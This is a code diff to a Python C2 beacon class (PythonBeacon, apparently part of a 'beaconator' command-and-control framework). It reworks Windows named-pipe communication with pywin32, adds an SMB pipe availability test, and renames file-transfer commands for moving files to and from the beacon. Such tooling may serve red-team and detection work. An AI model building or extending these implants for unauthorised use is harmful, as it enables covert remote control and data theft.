@@ -131,22 +131,54 @@ class PythonBeacon:
             if os.name == 'nt':  # Windows
                 pipe_path = f"\\\\.\\pipe\\{self.pipe_name}"
                 
-                # Try to open the named pipe
-                import msvcrt
-                pipe_handle = os.open(pipe_path, os.O_RDWR | os.O_BINARY)
-                
-                os.write(pipe_handle, message.encode('utf-8'))
-                
-                if expect_response:
-                    if is_file_transfer:
-                        return pipe_handle  # Return handle for file operations
+                try:
+                    # Try to use win32pipe for proper named pipe handling
+                    import win32file
+                    import win32pipe
+                    import pywintypes
+                    
+                    # Wait for the named pipe to be available
+                    win32pipe.WaitNamedPipe(pipe_path, 5000)  # 5 second timeout
+                    
+                    # Open the named pipe
+                    pipe_handle = win32file.CreateFile(
+                        pipe_path,
+                        win32file.GENERIC_READ | win32file.GENERIC_WRITE,
+                        0,
+                        None,
+                        win32file.OPEN_EXISTING,
+                        0,
+                        None
+                    )
+                    
+                    # Write message
+                    win32file.WriteFile(pipe_handle, message.encode('utf-8'))
+                    
+                    if expect_response:
+                        if is_file_transfer:
+                            return pipe_handle  # Return handle for file operations
+                        else:
+                            # Read response
+                            result, response_data = win32file.ReadFile(pipe_handle, 4096)
+                            response = response_data.decode('utf-8').strip()
+                            win32file.CloseHandle(pipe_handle)
+                            return response
                     else:
-                        response = os.read(pipe_handle, 4096).decode('utf-8').strip()
-                        os.close(pipe_handle)
-                        return response
-                else:
-                    os.close(pipe_handle)
-                    return "OK"
+                        win32file.CloseHandle(pipe_handle)
+                        return "OK"
+                        
+                except ImportError:
+                    # Fallback to basic file operations if pywin32 not available
+                    self.log("pywin32 not available, using basic file operations")
+                    with open(pipe_path, 'r+b') as pipe:
+                        pipe.write(message.encode('utf-8'))
+                        pipe.flush()
+                        
+                        if expect_response:
+                            response = pipe.read(4096).decode('utf-8').strip()
+                            return response
+                        else:
+                            return "OK"
                     
             else:  # Unix-like (FIFO)
                 pipe_path = f"/tmp/beaconator_c2_pipes/{self.pipe_name}"
@@ -170,6 +202,9 @@ class PythonBeacon:
                 
         except Exception as e:
             self.log(f"SMB Error: {e}")
+            # Provide more specific error information
+            if "No such file or directory" in str(e):
+                return f"ERROR: Named pipe '{self.pipe_name}' not found. Make sure SMB receiver is running."
             return f"ERROR: {e}"
 
     def send_message(self, message, expect_response=True, is_file_transfer=False):
@@ -247,7 +282,7 @@ class PythonBeacon:
             return "ERROR: File transfer not supported over UDP"
             
         try:
-            message = f"to_agent|{filename}"
+            message = f"to_beacon|{filename}"
             
             if self.protocol == "tcp":
                 sock = self.send_message(message, expect_response=True, is_file_transfer=True)
@@ -310,7 +345,7 @@ class PythonBeacon:
             if not file_path.exists():
                 return f"ERROR: File not found: {filename}"
                 
-            message = f"from_agent|{file_path.name}"
+            message = f"from_beacon|{file_path.name}"
             
             if self.protocol == "tcp":
                 sock = self.send_message(message, expect_response=True, is_file_transfer=True)
@@ -418,6 +453,38 @@ class PythonBeacon:
             except Exception as e:
                 self.log(f"UDP test failed: {e}")
                 return False
+                
+        elif self.protocol == "smb":
+            # Test SMB named pipe availability
+            pipe_path = f"\\\\.\\pipe\\{self.pipe_name}"
+            self.log(f"SMB test: Checking for named pipe: {pipe_path}")
+            
+            if os.name == 'nt':
+                try:
+                    import win32pipe
+                    # Check if named pipe exists
+                    result = win32pipe.WaitNamedPipe(pipe_path, 1000)  # 1 second timeout
+                    if result:
+                        self.log("SMB test: Named pipe is available")
+                        return True
+                    else:
+                        self.log("SMB test: Named pipe not available - make sure SMB receiver is running")
+                        return False
+                except ImportError:
+                    self.log("SMB test: pywin32 not available, will try basic file operations")
+                    return True
+                except Exception as e:
+                    self.log(f"SMB test failed: {e}")
+                    return False
+            else:
+                # Unix FIFO test
+                pipe_path = f"/tmp/beaconator_c2_pipes/{self.pipe_name}"
+                if os.path.exists(pipe_path):
+                    self.log("SMB test: FIFO exists")
+                    return True
+                else:
+                    self.log(f"SMB test: FIFO not found at {pipe_path}")
+                    return False
         
         return True  # Skip test for other protocols
 
